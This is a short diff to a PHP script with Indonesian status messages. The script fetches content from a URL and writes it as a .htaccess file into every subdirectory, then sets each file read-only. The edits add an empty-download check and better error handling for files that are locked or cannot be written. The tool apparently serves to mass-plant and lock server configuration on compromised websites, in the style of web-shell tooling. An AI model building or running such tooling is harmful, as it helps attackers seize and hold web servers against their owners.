@@ -12,7 +12,7 @@ function fetchFileFromUrl($url) {
     $data = curl_exec($ch);
     $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
-    return ($http_code === 200) ? $data : false;
+    return ($http_code === 200 && strlen(trim($data)) > 0) ? $data : false;
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -63,14 +63,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $path = $dir . '/' . $item;
                     if (is_dir($path)) {
                         $htaccessPath = $path . '/.htaccess';
-                        if (@file_put_contents($htaccessPath, $content) !== false) {
+
+                        if (file_exists($htaccessPath) && !is_writable($htaccessPath)) {
+                            $error[] = "❌ Gagal deploy ke: $htaccessPath (file tidak writable / dilock)";
+                        } elseif (@file_put_contents($htaccessPath, $content) === false) {
+                            $error[] = "❌ Gagal deploy ke: $htaccessPath (tidak bisa menulis file)";
+                        } else {
                             if (@chmod($htaccessPath, 0444)) {
                                 $success[] = "✅ Deployed & chmod .htaccess: $htaccessPath";
                             } else {
                                 $error[] = "❌ Gagal chmod .htaccess 0444: $htaccessPath";
                             }
-                        } else {
-                            $error[] = "❌ Gagal deploy ke: $htaccessPath (tidak bisa menulis file)";
                         }
                         deployHtaccess($path, $content, $success, $error);
                     }
